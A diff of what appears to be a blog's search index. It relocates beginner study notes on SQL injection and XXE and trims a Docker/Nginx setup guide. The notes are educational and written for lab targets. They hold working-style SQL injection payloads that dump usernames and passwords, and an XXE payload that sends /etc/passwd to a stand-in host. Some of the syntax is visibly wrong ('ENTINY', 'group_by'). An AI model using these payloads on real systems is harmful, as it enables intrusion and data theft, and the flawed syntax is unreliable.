@@ -1,6 +1,252 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>SQL注入学习笔记</title>
+    <url>/2024/06/02/SQL%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[前言本文是初学web安全时写的，有许多地方不够严谨，逻辑上也存在问题，请见谅~
+SQL注入当客户端提交的数据未作处理或转义，直接带入数据库
+具体来说，当Web应用程序对用户输入数据的合理性没有进行判断时，前端传入后端的参数就可能被攻击者所控制，并且根据这些参数带入数据库查询。攻击者可以通过构造不同的SQL语句来对数据库进行任意查询、增加、删除或修改等操作——-&gt;(通过构造一条精巧的语句来查询想要得到的信息 )
+
+分类
+按照查询字段
+字符型：当输入的参数为字符串时，称为字符型
+数字型：当输入的参数为整形时，可以认为是数字型注入
+
+
+按照注入方法
+Union注入(联合注入)
+报错注入
+布尔注入
+时间注入
+
+
+
+注入点是可以实行注入的地方，通常是一个访问数据库的连接 
+比如
+http://2.0.0.1/sql/Less-1/index.php?id= //id这个地方就是一个注入点
+
+判断字符型注入和数字型注入数字型一般提交内容为数字，但是数字不一定为数字型
+1.使用and 1&#x3D;1 和 and 1&#x3D;2来判断
+
+如果提交and 1&#x3D;1 和 and 1&#x3D;2都能正常显示界面，则为字符型注入，原因是输入的东西相当于被引号括起来了，and就不是 指令(字符型需要闭合符’’来提交)
+如果提交and 1&#x3D;1能正常显示，提交and 1&#x3D;2不能正常显示，则为数字型
+
+2.可以使用 2-1判断
+http://2.0.0.1/sql/Less-1/index.php?id= 2-1//数字型：会查找id=1的值//字符型：不能运算，仍然显示原来的结果
+
+ps：为什么不用+？+有的时候会被理解为空格
+闭合方式‘ , “ , ‘) , “)
+
+闭合的作用手动提交闭合符号，结束前一段查询语句
+后面即可加入其他语句，查询需要的参数
+不需要的语句可以用注释符号’–+’或’#’或’%23’注释掉
+Union联合注入注意：联合查询必须要求列数一致，否则报错
+查询回显位：查询回显位通常指的是在执行查询操作后，确定查询结果在页面上的哪个位置显示出来。这通常与网页开发、数据库查询以及命令行界面操作相关。
+步骤​	0.查找注入点
+
+先判断字符型注入还是数字型注入，如果是字符型，找到它的闭合方式
+ /*1.字符型：要自己加一个闭合符提前结束闭合，不然group by语句被闭合就失效了 ?id=1&#x27; group by 10 --+2.数字型：直接group by----用order by也可以-----*/
+
+
+二分法判断列数（group by&#x2F;order by），比如先group by 10 再group by 5这样
+
+根据列数进行union查询
+ -- 比如得到列数是3字符型?id=1&#x27; union select 1,2,3 --+-- 如果想看到联合查询查出来的东西，那么需要让前面为假（可以让id等于一个没有的值）
+
+查询回显位置
+
+
+拿到表名!!!数据库information_schema
+
+ 
+-- 比如对于Less-1(字符型)...../index.php?id=0&#x27; union select 1,table_name,3 from information_schema.tables where table_schema=database() --+ 加上where限定是回显位显示的更准确，直接等于database()能更好绕过防火墙
+
+即使加上了where限定，但是对于多个属于同一个库的表，还是会出现回显位只能显示第一个表的情况。这时需要group_concat()
+/index.php?id=0&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where schema.table_scema=database() --+  就能显示属于当前库所有表
+
+拿到列名与前面类似
+/index.php?id=0&#x27; union select 1,column_name,3 from information_schema.columns where table_shcema=database() and table_name = &#x27;users&#x27; --+ 
+
+可以获取到表名为users，列名id，username，password，然后就可以获取全部信息了
+字符型：/index.php id=-1&#x27; union select 1,group_concat(username,password),3 from user --+
+
+group_concat()之间可以自己加入分隔符加强可读性
+数字型union注入与字符型的区别：不用判断闭合方式
+报错注入
+
+报错注入：构造语句，让错误信息中夹杂可以显示数据库内容的查询语句
+extractvalue注入select extractvalue(列名（XML文档对象名称）,路径) from 表名;-- 注入的时候不考虑列到底存不存在
+
+如何让它报错1.如果只是写错路径下的名字，不会报错，只是找不到
+2.路径格式错误，报错，会把错的路径报出来
+​	构造思路：既然错的路径会被报出来，能不能利用这一点，在报错这个地方报错之前先回显一些有用的信息
+select extractvalue(列名,concat(0x7e,(select database())) from 表名;-- 0x7e是~的ASCII值，使路径错误引起报错                   
+
+index.php?id=1 union select 1,2,extractvalue(1,concat(0x7e,(concat(select database()))))-- 路径错误引起报错，可以回显当前数据库的名字-- 也可以这么写index.php?id=1 and 1=extractvalue(1,concat(0x7e,(concat(select database()))))
+
+如何获得不同的信息在concat的第二个参数动手脚
+获取表名
+index.php?id=1 and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))
+
+获取列名
+index.php?id=1 and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)))
+
+获取详细信息
+index.php?id=1 and 1=extractvalue(1,concat(0x7e,(select group_by(id,username,password) from 想查的表名)))
+
+ps:报错的回显位最多只能显示32个字符，可以用substring解决这个问题
+
+index.php?id=1 and 1=extractvalue(1,concat(0x7e,(select substring(group_by(id,username,password),30,30) from 想查的表名)))-- 从第30个字符再往后显示30个字符
+
+updatexml注入
+原理与extractvalue()一样，在第二个参数-xml路径上动手脚，参数用法也和extractvalue()一样
+
+floor报错
+
+
+
+
+报错原理
+
+分析rand()中传入0后，floor(rand(0)*2)随机出的字符串为01101，rand()函数进行分组group by和统计count()时可能会多次执行，导致键值key重复
+
+第一次统计时，group_key里面没有security-0这个键值，concat_ws()要重新计算一个键值给它（指group_key），计算的结果就是0下一位security-1，加入group_key中，进行统计；第二次统计时，键值存在，其实算的是第三位的security-1，键值存在，count（）++；再下一位，遇到security-0，键值不存在，重新计算到下一位security-1，加入group_key中，但是原本已经有security-1这个键值了，发生键值冲突，报错
+select count(*),concat_ws(&#x27;-&#x27;,(database()),floor(rand(0)*2)) as a from 表名 group by a;/*这里的from 表名 是为了让rand（）产生足够多次数的计算，一般使用行数较多的默认数据表，比如information_schema.tables*/
+
+
+
+盲注
+布尔盲注web页面只返回true真和false假 两种类型，利用页面返回不同，逐个猜解数据
+
+
+
+
+但是ascii()并不能对字符串中的每个字符都求得ascii值，只能显示第一个字符的ascii码值，所以需要substr(str,n,k)&#x2F;substring(str,n,k)来辅助(从第n个字符开始显示k个字符)
+index.php?id=1 and substr((&#x27;abcd&#x27;),1,1) //把abcd换成想要的语句
+
+
+时间盲注
+
+
+-- 可以根据页面响应时间判断字符型-闭合方式/数字型
+
+
+-- exampleselect if(acsii(substr((select database()),1,1))&gt;=97,sleep(10),sleep(0))
+
+
+
+宽字节注入
+
+局限性：宽字节注入必须使用GBKB编码
+意思就是%5c()原本应该和后面的单引号结合，但是却被解析成和前面自己输入进去的一个字符结合，使得\失去自己的作用
+
+http://192.168.127.186/sql/Less-32/index.php?id=-1%df&#x27; union select 1,group_concat(username,id,password),3 from users --+
+
+
+
+注入文件上传mysql文件上传要点show variables like &#x27;%secure%&#x27;; -- 来查看MySQL是否有读写文件权限，如果secure_file_priv的值是空的，那么MySQL可以在任何位置读取和写入文件（这通常是不安全的）。如果它被设置为一个目录的路径，那么MySQL只能在该目录内读取和写入文件into outfile 命令的使用环境:必须知道一个，服务器上可以写入文件的文件夹的完整路径
+
+步骤
+还是先判断字符型和数字型
+如果是字符型，再判断闭合方式 加上and 1&#x3D;2 和and 1&#x3D;1判断闭合符是否正确
+然后判断列数
+
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>Web安全 - SQL注入 - PHP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>XXE学习笔记</title>
+    <url>/2024/09/11/XML%20&amp;&amp;%20XXE/</url>
+    <content><![CDATA[前言本文是初学web安全时写的，有许多地方不够严谨，逻辑上也存在问题，请见谅~
+XML与HTML的不同与html区别：html表示与数据相关，XML更多用于数据传输、存储
+XML结构
+&lt;?xml version=&quot;1.0&quot;?&gt;表示版本号，xml处理解析时的规范&lt;Person&gt;...&lt;/Person&gt;表示根元素，XML文档需有且仅有一个根元素根元素内有两个赋值的嵌套标签子元素&lt;Name&gt;&lt;/Name&gt;,&lt;Age&gt;&lt;/Age&gt;
+
+注意：元素标签名对大小写敏感
+
+上述单独字符不能直接出现，会被错误解析
+实体（ENTITIY）ENTITY就像XML中的变量，可以对其进行赋值，在XML文档的其他地方进行引用，实体在XML的文档类型定义部分（DTD）被单独定义描述
+XML 文档的根元素通常与 DTD 中定义的根元素名称相匹配
+ 
+&lt;!DOCTYPE Person [	&lt;!ENTITY name &quot;XXX&quot;&gt;]&gt;&lt;Person&gt;    &lt;Name&gt;&amp;name;&lt;/Name&gt;    &lt;Age&gt;20&lt;/Age&gt;&lt;/Person&gt;前面的DOCTYPE表示这是一个DTD，用ENTITTY定义了一个叫做name的实体，赋值为XXX;后面可以直接用&amp;跟上实体名引用这个实体，可以防止重复赋值
+
+
+
+DTD分类DTD并不是XML文档的一部分，它们总是在根元素的定义之上-&gt;DTD像实体一样可以从外部加载
+
+一般实体&#x2F;通用实体（general entities）
+  如上面的那个实体
+  引用外部dtd：
+  解析器将从这个外部dtd中提取并解析内容
+  &lt;!DOCTYPE Pwn SYSTEM &quot;xxx.dtd&quot;&gt; dtd的URI&lt;Pwn&gt;test&lt;/Pwn&gt; 是 XML 文档的根元素，它的名字与 DOCTYPE 声明中的名称相匹配。这意味着 Pwn 是这个 XML 文档的根元素，它包含的文本是 test。
+
+
+参数实体
+  必须定义在单独的dtd区域内，参数实体只能在同一个DTD中调用
+  比如，用一个实体给另外一个实体赋值
+  &lt;!ENTITY % outer &lt;!ENTITY inner  &quot;xxx&quot;&gt;&gt;
+
+  ​	常用于XXE（外部实体注入）
+  dtd中调用参数实体
+  参数实体只能在同一个DTD中调用！！！
+  &lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE Pwn[	&lt;!ENTITY % outer &quot;&lt;!ENTITY inner SYSTEM &#x27;xxx&#x27;&gt;&quot;&gt;	%outer;]&gt;&lt;Pwn&gt;&amp;inner;&lt;/Pwn&gt;
+
+  
+  XML调用DTD中实体参数的大概流程：XML解释器发现这段代码时，先检查版本；然后发现dtd，这个dtd在xml文档中，可以叫做内联dtd，%开头的是参数实体标志，%outer的值是inner中解析出的东西；调用被赋值的%outer相当于
+
+预定义实体
+  某些特殊符号的一组预定义数值集，这些特殊符号有可能会破坏XML结构（报错），可以选择用其他形式比如十六进制表示这类符号
+  &lt;test&gt;&amp;#x3C;&lt;/test&gt; 这一串十六进制表示了&lt;
+
+XML安全性问题
+ENTITY  实体可以被赋值（存储数据），但是实体功能不止这个，外部实体就是其中一个功能。
+  实体不仅能用来存储指定数值，还可以从本地文件或远程网络中调取相关数据，作为后续实体引用，但是这样带来了广泛的攻击面
+  比如：
+  &lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE XXE[&lt;!ENTITY subcribe SYSTEM &quot;secret.txt&quot;&gt;]&gt;&lt;pwn&gt;&amp;subscribe;&lt;/pwn&gt;
+
+  SYSTEM表示后面的内容是外部实体；
+  如果外部实体长得是标签或者和XML很像的东西，XML解析器会报错；
+  这样的实体赋值并不是secret.txt，而是其中的内容，XML在此接收任意有效的URI包括文件，HTTP，ftp和其他协议形式的内容
+  外部实体读取了数据，这种就是外部实体注入攻击（XXE）
+外部实体注入攻击（XXE）分类带内数据  上面的示例涉及的就是带内XXE；
+  XML解析后的输出会直接显示在屏幕上
+基于错误  解析结果只有错误信息（类似Blind XXE）
+带外数据  OOB；真正的盲注，XML解析后无任何输出响应（无回显），必须执行一些带外请求把目标数据提取出来
+  场景：
+  
+  有一个能解析XML但是没有任何输出响应的web应用，为了测试这种盲注XXE，我们可以用非文件路径的外部实体来请求这里的web应用，可以用dns平台监听web应用是否解析了XML，也可以用自己构造好的网站（SYSTEM后的外部实体URL为测试的地方）
+
+
+
+如果监听到了，就说明XML被成功解析，目标web应用正在尝试获取我们构造的网站上的资源作为外部实体，这样我们可以利用受害者的身份发起请求（服务器端请求伪造（SSRF））
+Payloadeg：
+
+&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE XXE[&lt;!ENTINY %passwd SYSTEM &quot;/etc/passwd&quot;&gt;&lt;!ENTINY %wrapper &quot;&lt;!ENTINY send SYSTEM &#x27;http://xxx.com/?passwd;&#x27;&gt;&quot;&gt;%wrapper;]&gt;&lt;pwn&gt;send;&lt;/pwn&gt;XML解释器会先解析/etc/passwd的内容赋值到参数实体%passwd中，然后解析URL中的内容赋给实体send，send再赋给参数实体%wrapper但是这样会报错，根据xml规范， dtd内部子集的参数实体调用不能在实际的标记语言（html，svg等）中来调用参数实体，但是可以在同级别中被当作标记语言调用，外部参数实体不受此限制，可以借助外部dtd绕过这个限制
+
+
+比如payload形式为：
+&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE data SYSTEM &quot;/xxx/xx/x/test.dtd&quot;&gt;;&lt;data&gt;&amp;send;&lt;/data&gt; 莫名冒出来的send实体就来自外部的dtd
+
+
+
+%passwd最终会变成URL的一部分
+
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>XXE &amp;&amp; XML</category>
+      </categories>
+      <tags>
+        <tag>Web安全 - XXE &amp;&amp; XML</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Vue学习笔记</title>
     <url>/2025/03/05/Vue/</url>
     <content><![CDATA[前期准备下载node.js,安装VueCLI
@@ -371,252 +617,6 @@ eg.模拟v-show
       </tags>
   </entry>
   <entry>
-    <title>SQL注入学习笔记</title>
-    <url>/2024/06/02/SQL%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[前言本文是初学web安全时写的，有许多地方不够严谨，逻辑上也存在问题，请见谅~
-SQL注入当客户端提交的数据未作处理或转义，直接带入数据库
-具体来说，当Web应用程序对用户输入数据的合理性没有进行判断时，前端传入后端的参数就可能被攻击者所控制，并且根据这些参数带入数据库查询。攻击者可以通过构造不同的SQL语句来对数据库进行任意查询、增加、删除或修改等操作——-&gt;(通过构造一条精巧的语句来查询想要得到的信息 )
-
-分类
-按照查询字段
-字符型：当输入的参数为字符串时，称为字符型
-数字型：当输入的参数为整形时，可以认为是数字型注入
-
-
-按照注入方法
-Union注入(联合注入)
-报错注入
-布尔注入
-时间注入
-
-
-
-注入点是可以实行注入的地方，通常是一个访问数据库的连接 
-比如
-http://2.0.0.1/sql/Less-1/index.php?id= //id这个地方就是一个注入点
-
-判断字符型注入和数字型注入数字型一般提交内容为数字，但是数字不一定为数字型
-1.使用and 1&#x3D;1 和 and 1&#x3D;2来判断
-
-如果提交and 1&#x3D;1 和 and 1&#x3D;2都能正常显示界面，则为字符型注入，原因是输入的东西相当于被引号括起来了，and就不是 指令(字符型需要闭合符’’来提交)
-如果提交and 1&#x3D;1能正常显示，提交and 1&#x3D;2不能正常显示，则为数字型
-
-2.可以使用 2-1判断
-http://2.0.0.1/sql/Less-1/index.php?id= 2-1//数字型：会查找id=1的值//字符型：不能运算，仍然显示原来的结果
-
-ps：为什么不用+？+有的时候会被理解为空格
-闭合方式‘ , “ , ‘) , “)
-
-闭合的作用手动提交闭合符号，结束前一段查询语句
-后面即可加入其他语句，查询需要的参数
-不需要的语句可以用注释符号’–+’或’#’或’%23’注释掉
-Union联合注入注意：联合查询必须要求列数一致，否则报错
-查询回显位：查询回显位通常指的是在执行查询操作后，确定查询结果在页面上的哪个位置显示出来。这通常与网页开发、数据库查询以及命令行界面操作相关。
-步骤​	0.查找注入点
-
-先判断字符型注入还是数字型注入，如果是字符型，找到它的闭合方式
- /*1.字符型：要自己加一个闭合符提前结束闭合，不然group by语句被闭合就失效了 ?id=1&#x27; group by 10 --+2.数字型：直接group by----用order by也可以-----*/
-
-
-二分法判断列数（group by&#x2F;order by），比如先group by 10 再group by 5这样
-
-根据列数进行union查询
- -- 比如得到列数是3字符型?id=1&#x27; union select 1,2,3 --+-- 如果想看到联合查询查出来的东西，那么需要让前面为假（可以让id等于一个没有的值）
-
-查询回显位置
-
-
-拿到表名!!!数据库information_schema
-
- 
--- 比如对于Less-1(字符型)...../index.php?id=0&#x27; union select 1,table_name,3 from information_schema.tables where table_schema=database() --+ 加上where限定是回显位显示的更准确，直接等于database()能更好绕过防火墙
-
-即使加上了where限定，但是对于多个属于同一个库的表，还是会出现回显位只能显示第一个表的情况。这时需要group_concat()
-/index.php?id=0&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where schema.table_scema=database() --+  就能显示属于当前库所有表
-
-拿到列名与前面类似
-/index.php?id=0&#x27; union select 1,column_name,3 from information_schema.columns where table_shcema=database() and table_name = &#x27;users&#x27; --+ 
-
-可以获取到表名为users，列名id，username，password，然后就可以获取全部信息了
-字符型：/index.php id=-1&#x27; union select 1,group_concat(username,password),3 from user --+
-
-group_concat()之间可以自己加入分隔符加强可读性
-数字型union注入与字符型的区别：不用判断闭合方式
-报错注入
-
-报错注入：构造语句，让错误信息中夹杂可以显示数据库内容的查询语句
-extractvalue注入select extractvalue(列名（XML文档对象名称）,路径) from 表名;-- 注入的时候不考虑列到底存不存在
-
-如何让它报错1.如果只是写错路径下的名字，不会报错，只是找不到
-2.路径格式错误，报错，会把错的路径报出来
-​	构造思路：既然错的路径会被报出来，能不能利用这一点，在报错这个地方报错之前先回显一些有用的信息
-select extractvalue(列名,concat(0x7e,(select database())) from 表名;-- 0x7e是~的ASCII值，使路径错误引起报错                   
-
-index.php?id=1 union select 1,2,extractvalue(1,concat(0x7e,(concat(select database()))))-- 路径错误引起报错，可以回显当前数据库的名字-- 也可以这么写index.php?id=1 and 1=extractvalue(1,concat(0x7e,(concat(select database()))))
-
-如何获得不同的信息在concat的第二个参数动手脚
-获取表名
-index.php?id=1 and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))
-
-获取列名
-index.php?id=1 and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)))
-
-获取详细信息
-index.php?id=1 and 1=extractvalue(1,concat(0x7e,(select group_by(id,username,password) from 想查的表名)))
-
-ps:报错的回显位最多只能显示32个字符，可以用substring解决这个问题
-
-index.php?id=1 and 1=extractvalue(1,concat(0x7e,(select substring(group_by(id,username,password),30,30) from 想查的表名)))-- 从第30个字符再往后显示30个字符
-
-updatexml注入
-原理与extractvalue()一样，在第二个参数-xml路径上动手脚，参数用法也和extractvalue()一样
-
-floor报错
-
-
-
-
-报错原理
-
-分析rand()中传入0后，floor(rand(0)*2)随机出的字符串为01101，rand()函数进行分组group by和统计count()时可能会多次执行，导致键值key重复
-
-第一次统计时，group_key里面没有security-0这个键值，concat_ws()要重新计算一个键值给它（指group_key），计算的结果就是0下一位security-1，加入group_key中，进行统计；第二次统计时，键值存在，其实算的是第三位的security-1，键值存在，count（）++；再下一位，遇到security-0，键值不存在，重新计算到下一位security-1，加入group_key中，但是原本已经有security-1这个键值了，发生键值冲突，报错
-select count(*),concat_ws(&#x27;-&#x27;,(database()),floor(rand(0)*2)) as a from 表名 group by a;/*这里的from 表名 是为了让rand（）产生足够多次数的计算，一般使用行数较多的默认数据表，比如information_schema.tables*/
-
-
-
-盲注
-布尔盲注web页面只返回true真和false假 两种类型，利用页面返回不同，逐个猜解数据
-
-
-
-
-但是ascii()并不能对字符串中的每个字符都求得ascii值，只能显示第一个字符的ascii码值，所以需要substr(str,n,k)&#x2F;substring(str,n,k)来辅助(从第n个字符开始显示k个字符)
-index.php?id=1 and substr((&#x27;abcd&#x27;),1,1) //把abcd换成想要的语句
-
-
-时间盲注
-
-
--- 可以根据页面响应时间判断字符型-闭合方式/数字型
-
-
--- exampleselect if(acsii(substr((select database()),1,1))&gt;=97,sleep(10),sleep(0))
-
-
-
-宽字节注入
-
-局限性：宽字节注入必须使用GBKB编码
-意思就是%5c()原本应该和后面的单引号结合，但是却被解析成和前面自己输入进去的一个字符结合，使得\失去自己的作用
-
-http://192.168.127.186/sql/Less-32/index.php?id=-1%df&#x27; union select 1,group_concat(username,id,password),3 from users --+
-
-
-
-注入文件上传mysql文件上传要点show variables like &#x27;%secure%&#x27;; -- 来查看MySQL是否有读写文件权限，如果secure_file_priv的值是空的，那么MySQL可以在任何位置读取和写入文件（这通常是不安全的）。如果它被设置为一个目录的路径，那么MySQL只能在该目录内读取和写入文件into outfile 命令的使用环境:必须知道一个，服务器上可以写入文件的文件夹的完整路径
-
-步骤
-还是先判断字符型和数字型
-如果是字符型，再判断闭合方式 加上and 1&#x3D;2 和and 1&#x3D;1判断闭合符是否正确
-然后判断列数
-
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>SQL注入</category>
-      </categories>
-      <tags>
-        <tag>Web安全 - SQL注入 - PHP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>XXE学习笔记</title>
-    <url>/2024/09/11/XML%20&amp;&amp;%20XXE/</url>
-    <content><![CDATA[前言本文是初学web安全时写的，有许多地方不够严谨，逻辑上也存在问题，请见谅~
-XML与HTML的不同与html区别：html表示与数据相关，XML更多用于数据传输、存储
-XML结构
-&lt;?xml version=&quot;1.0&quot;?&gt;表示版本号，xml处理解析时的规范&lt;Person&gt;...&lt;/Person&gt;表示根元素，XML文档需有且仅有一个根元素根元素内有两个赋值的嵌套标签子元素&lt;Name&gt;&lt;/Name&gt;,&lt;Age&gt;&lt;/Age&gt;
-
-注意：元素标签名对大小写敏感
-
-上述单独字符不能直接出现，会被错误解析
-实体（ENTITIY）ENTITY就像XML中的变量，可以对其进行赋值，在XML文档的其他地方进行引用，实体在XML的文档类型定义部分（DTD）被单独定义描述
-XML 文档的根元素通常与 DTD 中定义的根元素名称相匹配
- 
-&lt;!DOCTYPE Person [	&lt;!ENTITY name &quot;XXX&quot;&gt;]&gt;&lt;Person&gt;    &lt;Name&gt;&amp;name;&lt;/Name&gt;    &lt;Age&gt;20&lt;/Age&gt;&lt;/Person&gt;前面的DOCTYPE表示这是一个DTD，用ENTITTY定义了一个叫做name的实体，赋值为XXX;后面可以直接用&amp;跟上实体名引用这个实体，可以防止重复赋值
-
-
-
-DTD分类DTD并不是XML文档的一部分，它们总是在根元素的定义之上-&gt;DTD像实体一样可以从外部加载
-
-一般实体&#x2F;通用实体（general entities）
-  如上面的那个实体
-  引用外部dtd：
-  解析器将从这个外部dtd中提取并解析内容
-  &lt;!DOCTYPE Pwn SYSTEM &quot;xxx.dtd&quot;&gt; dtd的URI&lt;Pwn&gt;test&lt;/Pwn&gt; 是 XML 文档的根元素，它的名字与 DOCTYPE 声明中的名称相匹配。这意味着 Pwn 是这个 XML 文档的根元素，它包含的文本是 test。
-
-
-参数实体
-  必须定义在单独的dtd区域内，参数实体只能在同一个DTD中调用
-  比如，用一个实体给另外一个实体赋值
-  &lt;!ENTITY % outer &lt;!ENTITY inner  &quot;xxx&quot;&gt;&gt;
-
-  ​	常用于XXE（外部实体注入）
-  dtd中调用参数实体
-  参数实体只能在同一个DTD中调用！！！
-  &lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE Pwn[	&lt;!ENTITY % outer &quot;&lt;!ENTITY inner SYSTEM &#x27;xxx&#x27;&gt;&quot;&gt;	%outer;]&gt;&lt;Pwn&gt;&amp;inner;&lt;/Pwn&gt;
-
-  
-  XML调用DTD中实体参数的大概流程：XML解释器发现这段代码时，先检查版本；然后发现dtd，这个dtd在xml文档中，可以叫做内联dtd，%开头的是参数实体标志，%outer的值是inner中解析出的东西；调用被赋值的%outer相当于
-
-预定义实体
-  某些特殊符号的一组预定义数值集，这些特殊符号有可能会破坏XML结构（报错），可以选择用其他形式比如十六进制表示这类符号
-  &lt;test&gt;&amp;#x3C;&lt;/test&gt; 这一串十六进制表示了&lt;
-
-XML安全性问题
-ENTITY  实体可以被赋值（存储数据），但是实体功能不止这个，外部实体就是其中一个功能。
-  实体不仅能用来存储指定数值，还可以从本地文件或远程网络中调取相关数据，作为后续实体引用，但是这样带来了广泛的攻击面
-  比如：
-  &lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE XXE[&lt;!ENTITY subcribe SYSTEM &quot;secret.txt&quot;&gt;]&gt;&lt;pwn&gt;&amp;subscribe;&lt;/pwn&gt;
-
-  SYSTEM表示后面的内容是外部实体；
-  如果外部实体长得是标签或者和XML很像的东西，XML解析器会报错；
-  这样的实体赋值并不是secret.txt，而是其中的内容，XML在此接收任意有效的URI包括文件，HTTP，ftp和其他协议形式的内容
-  外部实体读取了数据，这种就是外部实体注入攻击（XXE）
-外部实体注入攻击（XXE）分类带内数据  上面的示例涉及的就是带内XXE；
-  XML解析后的输出会直接显示在屏幕上
-基于错误  解析结果只有错误信息（类似Blind XXE）
-带外数据  OOB；真正的盲注，XML解析后无任何输出响应（无回显），必须执行一些带外请求把目标数据提取出来
-  场景：
-  
-  有一个能解析XML但是没有任何输出响应的web应用，为了测试这种盲注XXE，我们可以用非文件路径的外部实体来请求这里的web应用，可以用dns平台监听web应用是否解析了XML，也可以用自己构造好的网站（SYSTEM后的外部实体URL为测试的地方）
-
-
-
-如果监听到了，就说明XML被成功解析，目标web应用正在尝试获取我们构造的网站上的资源作为外部实体，这样我们可以利用受害者的身份发起请求（服务器端请求伪造（SSRF））
-Payloadeg：
-
-&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE XXE[&lt;!ENTINY %passwd SYSTEM &quot;/etc/passwd&quot;&gt;&lt;!ENTINY %wrapper &quot;&lt;!ENTINY send SYSTEM &#x27;http://xxx.com/?passwd;&#x27;&gt;&quot;&gt;%wrapper;]&gt;&lt;pwn&gt;send;&lt;/pwn&gt;XML解释器会先解析/etc/passwd的内容赋值到参数实体%passwd中，然后解析URL中的内容赋给实体send，send再赋给参数实体%wrapper但是这样会报错，根据xml规范， dtd内部子集的参数实体调用不能在实际的标记语言（html，svg等）中来调用参数实体，但是可以在同级别中被当作标记语言调用，外部参数实体不受此限制，可以借助外部dtd绕过这个限制
-
-
-比如payload形式为：
-&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE data SYSTEM &quot;/xxx/xx/x/test.dtd&quot;&gt;;&lt;data&gt;&amp;send;&lt;/data&gt; 莫名冒出来的send实体就来自外部的dtd
-
-
-
-%passwd最终会变成URL的一部分
-
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>XXE &amp;&amp; XML</category>
-      </categories>
-      <tags>
-        <tag>Web安全 - XXE &amp;&amp; XML</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Docker</title>
     <url>/2025/01/06/docker/</url>
     <content><![CDATA[初识Docker环境为Ubuntu
@@ -789,161 +789,6 @@ SIZE列 前面是读写层大小括号内是镜像大小
       </categories>
       <tags>
         <tag>Docker</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>使用Docker搭建Nginx以及PHP-fpm</title>
-    <url>/2025/01/17/docker%E6%90%AD%E5%BB%BAnginx+php-fpm/</url>
-    <content><![CDATA[前言想自己搭建靶场所以学习docker+nginx+php，但是这两天一直卡在配环境上，踩了许多的坑最终才完成环境的配置
-参考了docker部署php和nginx环境_docker nginx php-CSDN博客
-编辑文件如果不喜欢用vim，可以用vscode远程连接然后打开文件夹进行文件编辑等操作
-参考：vscode连接远程服务器（傻瓜式教学）-CSDN博客
-OS：centOS 7.9 64位
-要点
-最好是自己创建一个网络，把php容器和nginx容器都加入该网络中（做了这步就很神奇的可以解析php了）
-自己创建目录结构尽量明了
-nginx容器的根目录路径和php容器的根目录路径要挂载到同一目录
-php.ini需要自己创建
-挂载后根目录中要有index.html等默认页面，不然会报403（刚遇到让人一头雾水）
-nginx的default.conf和nginx.conf一定要配置正确
-有问题多看日志，多拿错误日志信息问问ai（
-
-过程创建自己的网络docker network create mynet
-
-
- 后续php容器，nginx容器加入该网络
-创建辅助容器创建php和nginx两个容器，用于复制配置文件(仅仅用于辅助，我就没进行端口映射)
-docker run -d --name nginx nginxdocker run -d --name php php:7.3-fpm
-
-
-
-1.参数说明：-d 后台运行 –name 给容器取个名字
-
-
-路径设置
-
-
-使用docker cp命令：
-将容器中路径的内容复制到docker host路径中
-docker cp 容器名:路径 目的路径
-nginx的配置文件位于&#x2F;etc&#x2F;nginx
-nginx的日志文件位于&#x2F;var&#x2F;log
-php配置文件位于&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php
-
-编辑
-
-将nginx和php的配置文件复制到主机的&#x2F;data下，nginx的日志文件复制到&#x2F;data&#x2F;nginx
-
-mkdir /datacd /data#nginxdocker cp nginx:/etc/nginx ./docker cp nginx:/var/log ./nginx
-
-
-
- 用tree &#x2F;data看一下目录层级有没有正确
-如果没有安装tree
-yum install tree
-
-
-编辑
-复制php配置文件
-编辑
-
-进入php容器，可以用:
-php -i | grep php.ini
-得到配置文件路径
-&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php
-
-#php (工作路径处于/data下)docker cp php:/usr/local/etc/php ./
-
-
-做完以上操作后，目录层级结构如下：
-
-编辑
-做完这些，我们需要将php.ini-development或者php.ini-production中的其中一个改成php.ini
-#工作路径/datamv ./php/php.ini-development ./php/php.ini
-
-
- 修改后如下
-编辑
-然后我们需要有一个工作目录用来挂载初始页面目录,并且放一个index.html进去（不然到时候会403）
-mkdir ./wwwtouch ./www/index.html
-
-
- 目录层级如下
- 编辑
-删除辅助容器#加上-f就不用先停止容器docker rm -f $(docker ps -aq)
-
-
-创建新容器nginx：docker run \-d --name nginx \-p 80:80 \-v /data/nginx/nginx.conf:/etc/nginx/nginx.conf \-v /data/nginx/conf.d/default.conf:/etc/nginx/conf.d/default.conf \-v /data/nginx/log:/var/log/nginx \-v /data/www:/usr/share/nginx/www \--network mynet \nginx
-
-
-
-\1.    我新建了初始页面目录&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;www（原本的初始页面目录为&#x2F;usr&#x2F;share        &#x2F;nginx&#x2F;html）,将它挂载到我们创建好的工作目录&#x2F;data&#x2F;www下
